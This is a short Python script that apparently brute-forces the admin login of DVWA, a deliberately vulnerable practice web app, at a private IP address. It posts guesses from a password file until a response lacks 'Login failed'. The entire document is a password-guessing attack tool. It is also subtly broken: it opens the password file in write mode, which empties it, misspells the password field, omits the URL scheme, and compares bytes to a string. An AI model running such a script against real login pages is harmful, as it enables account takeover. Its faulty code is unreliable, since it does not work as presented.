#!/usr/bin/env python

import requests

target_url = "192.168.0.101/dvwa/login.php"
data_dict = {"username":"admin","passsword":"","Login":"submit"}

with open("passwords.txt","w") as passwords_file:
    for line in passwords_file:
        password = line.strip()
        data_dict["passsword"] = password
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print(("[+} Got the password --> " + password))
            exit()


print("[+] Reached the end of file.")
